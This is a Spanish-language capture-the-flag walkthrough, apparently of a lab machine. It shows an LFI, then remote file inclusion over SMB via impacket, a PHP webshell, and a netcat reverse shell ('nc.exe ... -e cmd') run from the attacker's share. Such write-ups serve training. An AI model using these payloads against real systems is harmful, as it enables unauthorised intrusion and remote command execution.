PORT      STATE SERVICE
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49667/tcp open  unknown

-Encontramos ruta vulnerable a Local File Inclusion (LFI):
	-http://10.10.10.151/blog/?lang=/windows/win.ini
		; for 16-bit app support
		[fonts]
		[extensions]
		[mci extensions]
		[files]
		[Mail]
		MAPI=1

-No podemos hacer nada a través del LFI

-Probamos posible Remote File Inclusion (RFI):
	-http://10.10.10.151/blog/?lang=http://10.10.14.40/test.php
		(**NO FUNCIONA**, NO RECIBIMOS CONEXIÓN)

-Cómo tiene el puerto 445 (smb) abierto, vamos a probar el Remote File Inclusion (RFI) por smb:
	1-Iniciamos servidor con impacket-smbserver:
		-impacket-smbserver smb $(pwd) -smb2support
	2-Hacemos la petición a nuestro servidor smb desde la URL para leer un archivo:
		-http://10.10.10.151/blog/?lang=\\10.10.14.40\smb\allports
			**[*] AUTHENTICATE_MESSAGE (\,SNIPER)**
			**[*] User SNIPER\ authenticated successfully**
			(**FUNCIONA!!** , HA HECHO LA PETICIÓN A NUESTRO SERVIDOR  Y EL CONTENIDO DE ALLPORTS SE VE EN LA WEB!!)

## RFI to RCE

1-Nos creamos archivo 'test.php' con una webshell

2-Iniciamos el servidor y probamos a ejecutar un comando desde la URL:
	-impacket-smbserver smb $(pwd) -smb2support
	-http://10.10.10.151/blog/?lang=\\10.10.14.40\smb\shell.php&cmd=whoami
		**nt authority\iusr** (Funcionaa!!)

3-Para ganar acceso a la máquina:
	1-Nos copiamos el archivo **nc.exe** en el directorio actual de trabajo
		-cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
	2-Le damos permisos de ejecución:
		-chmod +x nc.exe
	3-Iniciamos el servidor y nos ponemos en escucha con Netcat:
		-impacket-smbserver smb $(pwd) -smb2support
		-nc -lvnp 1234
	4-Hacemos una petición a nuestro archivo 'nc.exe' aprovechando el RFI y la webshell, mandándonos una RS:
		-http://10.10.10.151/blog/?lang=\\10.10.14.40\smb\shell.php&cmd=\\10.10.14.40\smb\nc.exe 10.10.14.40 1234 -e cmd
			**C:\inetpub\wwwroot\blog>whoami**
				**nt authority\iusr**
				(ESTAMOS DENTRO)

